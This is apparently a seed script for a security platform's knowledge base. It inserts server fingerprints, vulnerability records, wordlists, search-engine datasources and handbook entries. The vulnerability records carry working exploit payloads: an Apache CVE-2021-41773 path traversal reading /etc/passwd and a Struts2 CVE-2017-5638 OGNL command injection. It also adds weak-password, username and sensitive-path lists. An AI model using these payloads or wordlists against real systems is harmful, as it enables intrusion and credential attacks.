"""S3 seed: knowledge base sample data.

Inserts a small amount of data across all 6 knowledge tables to verify the
schema and endpoints. Idempotent on (name/identifier) uniqueness where applicable.

Usage:
    python3 scripts/seed_knowledge.py
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from sqlalchemy import select
from src.models.database import SessionLocal
from src.models.knowledge import (
    Fingerprint, KnowledgeDatasource, KnowledgeHandbook, KnowledgeTag,
    Payload, VulnKnowledge,
)


def run() -> None:
    session = SessionLocal()
    try:
        # ── 指纹库 (2 条) ──
        fp_nginx = session.scalar(select(Fingerprint).where(Fingerprint.component == "Nginx"))
        if fp_nginx is None:
            fp_nginx = Fingerprint(
                name="Nginx HTTP Server", category="service", component="Nginx",
                version="1.x", match_type="header",
                match_rule='Server: nginx', description="Nginx Web 服务器指纹",
                status="published", contributed_by="seed", reviewed_by="seed",
            )
            session.add(fp_nginx)
            session.flush()
            print(f"[seed] fingerprint: Nginx ({fp_nginx.id})")

        fp_apache = session.scalar(select(Fingerprint).where(Fingerprint.component == "Apache"))
        if fp_apache is None:
            fp_apache = Fingerprint(
                name="Apache HTTPD", category="service", component="Apache",
                version="2.4.x", match_type="header",
                match_rule='Server: Apache', description="Apache HTTP 服务器指纹",
                status="published", contributed_by="seed", reviewed_by="seed",
            )
            session.add(fp_apache)
            session.flush()
            print(f"[seed] fingerprint: Apache ({fp_apache.id})")

        # ── 漏洞知识库 (3 条) ──
        if session.scalar(select(VulnKnowledge).where(VulnKnowledge.vuln_id == "CVE-2021-41773")) is None:
            v1 = VulnKnowledge(
                name="Apache HTTP Server 路径穿越与RCE", severity="critical",
                vuln_id="CVE-2021-41773", vuln_type="路径穿越/RCE",
                vendor="Apache", product="HTTP Server", version_range="2.4.49",
                affected_scope="Apache 2.4.49, 启用 alias/cgid 时可 RCE",
                fingerprint_id=fp_apache.id,
                poc="GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd\ncurl --path-as-is http://target/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
                remediation="升级至 2.4.50+; 禁用 mod_cgi alias; 限制目录访问",
                data_source="manual", upstream_ref="CVE-2021-41773",
                status="published", contributed_by="seed", reviewed_by="seed",
            )
            session.add(v1)
            print("[seed] vuln: CVE-2021-41773 (Apache 路径穿越)")

        if session.scalar(select(VulnKnowledge).where(VulnKnowledge.vuln_id == "CVE-2017-5638")) is None:
            v2 = VulnKnowledge(
                name="Struts2 S2-045 RCE", severity="critical",
                vuln_id="CVE-2017-5638", vuln_type="RCE",
                vendor="Apache", product="Struts2", version_range="2.3.5-2.3.32, 2.5-2.5.10",
                affected_scope="基于 Jakarta 插件的 Struts2",
                poc='POST / HTTP/1.1\nContent-Type: %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd="id").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?{"cmd","/c",#cmd}:{"/bin/bash","-c",#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}',
                remediation="升级至 2.3.32/2.5.10.1+; 或移除 Jakarta multipart 解析",
                data_source="manual", status="published", contributed_by="seed", reviewed_by="seed",
            )
            session.add(v2)
            print("[seed] vuln: CVE-2017-5638 (Struts2 S2-045)")

        if session.scalar(select(VulnKnowledge).where(VulnKnowledge.name == "未授权访问-管理后台")) is None:
            v3 = VulnKnowledge(
                name="未授权访问-管理后台", severity="high",
                vuln_id=None, vuln_type="未授权访问",
                vendor="通用", product="管理后台", version_range="*",
                affected_scope="未鉴权的管理后台路径 /admin /manage",
                poc="GET /admin\nGET /manage/index\nGET /console",
                remediation="添加鉴权中间件; IP 白名单; 默认拒绝策略",
                data_source="manual", status="draft", contributed_by="analyst@eakis.local",
            )
            session.add(v3)
            print("[seed] vuln: 未授权访问-管理后台 (draft 状态)")

        # ── Payloads (字典/关键词合并) ──
        if session.scalar(select(Payload).where(Payload.category == "pass", Payload.group_name == "常见弱口令")) is None:
            session.add(Payload(
                name="常见弱口令 TOP20", category="pass", group_name="常见弱口令",
                content="123456\npassword\nadmin\nroot\n123456789\nqwerty\nabc123\n111111\nadmin123\nP@ssw0rd",
                weight=2.0, hit_count=0, description="常见弱密码",
            ))
            print("[seed] payload: 常见弱口令 (pass)")

        if session.scalar(select(Payload).where(Payload.category == "path", Payload.group_name == "敏感路径")) is None:
            session.add(Payload(
                name="敏感后台路径", category="path", group_name="敏感路径",
                content="/admin\n/admin/login\n/manage\n/console\n/.git/config\n/.env\n/backup.zip",
                weight=1.5, hit_count=0,
            ))
            print("[seed] payload: 敏感路径 (path)")

        if session.scalar(select(Payload).where(Payload.category == "user", Payload.group_name == "常见用户名")) is None:
            session.add(Payload(
                name="常见管理员用户名", category="user", group_name="常见用户名",
                content="admin\nroot\nadministrator\nadmin1\ntest\nguest\nuser",
                weight=1.0,
            ))
            print("[seed] payload: 常见用户名 (user)")

        if session.scalar(select(Payload).where(Payload.category == "header", Payload.group_name == "ua")) is None:
            # 多行 content 示例: 一个 UA 项含多行
            session.add(Payload(
                name="常见浏览器 UA", category="header", group_name="ua",
                content="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\nMozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                weight=1.0, description="多行 UA (演示 content 支持换行)",
            ))
            print("[seed] payload: 常见浏览器 UA (header/ua, 多行content)")

        if session.scalar(select(Payload).where(Payload.category == "keywords", Payload.group_name == "行业关键词")) is None:
            session.add(Payload(
                name="金融行业关键词", category="keywords", group_name="行业关键词",
                content="银行\n证券\n基金\n支付\n信贷\n风控\n反欺诈",
                weight=1.2,
            ))
            print("[seed] payload: 金融行业关键词 (keywords)")

        # ── 数据源 (2 条) ──
        if session.scalar(select(KnowledgeDatasource).where(KnowledgeDatasource.platform == "fofa")) is None:
            session.add(KnowledgeDatasource(
                name="Fofa 资产搜索引擎", platform="fofa",
                api_base_url="https://fofa.info/api",
                config='{"fields":["host","ip","port","title"],"page_size":100}',
                description="白帽汇资产搜索引擎", is_active=1,
            ))
            print("[seed] datasource: Fofa")
        if session.scalar(select(KnowledgeDatasource).where(KnowledgeDatasource.platform == "shodan")) is None:
            session.add(KnowledgeDatasource(
                name="Shodan", platform="shodan",
                api_base_url="https://api.shodan.io",
                config='{"fields":["ip_str","port","product"]}',
                description="Shodan 物联网搜索引擎", is_active=1,
            ))
            print("[seed] datasource: Shodan")

        # ── 攻防手册 (2 条) ──
        if session.scalar(select(KnowledgeHandbook).where(KnowledgeHandbook.title == "SQL注入应急响应流程")) is None:
            session.add(KnowledgeHandbook(
                title="SQL注入应急响应流程", category="应急响应",
                content="## SQL注入应急\n1. 隔离受影响系统\n2. 分析访问日志定位注入点\n3. 修复参数化查询\n4. 排查数据泄露\n5. 加固 WAF 规则",
                summary="SQL注入事件的标准应急响应步骤",
                status="published", contributed_by="seed", reviewed_by="seed",
            ))
            print("[seed] handbook: SQL注入应急响应流程")
        if session.scalar(select(KnowledgeHandbook).where(KnowledgeHandbook.title == "越权漏洞检测经验")) is None:
            session.add(KnowledgeHandbook(
                title="越权漏洞检测经验", category="攻击案例",
                content="## 越权检测\n- 水平越权: 替换 userId/orderId\n- 垂直越权: 普通用户访问管理员接口\n- 检测点: /api/user/{id} /api/order/{id}",
                status="draft", contributed_by="analyst@eakis.local",
            ))
            print("[seed] handbook: 越权漏洞检测经验 (draft)")

        # ── 标签示例 ──
        session.flush()
        if v1 := session.scalar(select(VulnKnowledge).where(VulnKnowledge.vuln_id == "CVE-2021-41773")):
            if not session.scalar(select(KnowledgeTag).where(KnowledgeTag.vuln_id == v1.id, KnowledgeTag.tag == "Apache")):
                session.add(KnowledgeTag(tag="Apache", scope="system", vuln_id=v1.id))
                session.add(KnowledgeTag(tag="RCE", scope="system", vuln_id=v1.id))
                print("[seed] tags: CVE-2021-41773 #Apache #RCE")

        session.commit()
        print("[seed] knowledge base seed done")
    except Exception:
        session.rollback()
        raise
    finally:
        session.close()


if __name__ == "__main__":
    run()
